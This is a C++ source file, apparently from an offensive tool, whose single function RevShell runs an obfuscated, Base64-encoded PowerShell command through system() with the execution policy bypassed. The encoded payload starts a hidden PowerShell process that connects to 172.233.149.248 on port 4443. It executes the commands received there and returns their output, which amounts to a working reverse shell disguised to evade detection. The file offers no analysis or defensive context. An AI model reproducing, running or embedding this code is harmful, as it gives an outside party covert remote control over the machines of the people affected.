#include "shell.h"

void RevShell() {
  std::string command = std::string(AY_OBFUSCATE("powershell -ep bypass -e "
    "\"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUA"
    "XABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQ"
    "BlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBw"
    "AEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAH"
    "kAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMA"
    "bABpAGUAbgB0ACgAJwAxADcAMgAuADIAMwAzAC4AMQA0ADkALgAyADQAOA"
    "AnACwAIAA0ADQANAAzACkAOwAKACAAIAAgACAAIAAgACAAIAAkAG4AZQB0"
    "AHcAbwByAGsAUwB0AHIAZQBhAG0AIAA9ACAAJAB0AGMAcABDAGwAaQBlAG"
    "4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAIAAgACAAIAAgACAA"
    "IAAgACQAYgB1AGYAZgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdA"
    "AgAGIAeQB0AGUAWwBdACAANgA1ADUAMwA1ADsACgAgACAAIAAgACAAIAAg"
    "ACAAdwBoAGkAbABlACAAKAAoACQAYgB5AHQAZQBzAFIAZQBhAGQAIAA9AC"
    "AAJABuAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQA"
    "YgB1AGYAZgBlAHIALAAgADAALAAgACQAYgB1AGYAZgBlAHIALgBMAGUAbg"
    "BnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AAoAIAAgACAAIAAgACAAIAAg"
    "ACAAIAAgACAAJAByAGUAYwBlAGkAdgBlAGQARABhAHQAYQAgAD0AIAAoAF"
    "sAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0A"
    "OgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHUAZg"
    "BmAGUAcgAsACAAMAAsACAAJABiAHkAdABlAHMAUgBlAGEAZAApACkAOwAK"
    "ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQB4AGUAYwB1AHQAaQBvAG"
    "4AUgBlAHMAdQBsAHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUA"
    "cwBzAGkAbwBuACAAJAByAGUAYwBlAGkAdgBlAGQARABhAHQAYQAgADIAPg"
    "AmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgADsACgAgACAAIAAg"
    "ACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHAAbwBuAHMAZQBUAG8AUwBlAG"
    "4AZAAgAD0AIAAkAGUAeABlAGMAdQB0AGkAbwBuAFIAZQBzAHUAbAB0ACAA"
    "KwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbw"
    "BuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAIAAg"
    "ACAAIAAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlAEIAeQB0AGUAcwAgAD"
    "0AIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMA"
    "SQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByAGUAcwBwAG8AbgBzAGUAVA"
    "BvAFMAZQBuAGQAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABu"
    "AGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJAByAG"
    "UAcwBwAG8AbgBzAGUAQgB5AHQAZQBzACwAIAAwACwAIAAkAHIAZQBzAHAA"
    "bwBuAHMAZQBCAHkAdABlAHMALgBMAGUAbgBnAHQAaAApADsACgAgACAAIA"
    "AgACAAIAAgACAAIAAgACAAIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBh"
    "AG0ALgBGAGwAdQBzAGgAKAApADsACgAgACAAIAAgACAAIAAgAH0ACgAgAC"
    "AAIAAgACAAIAAgACQAdABjAHAAQwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
    "KAApACAAfQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZA"
    "BlAG4A\""));
  system(command.c_str());
}
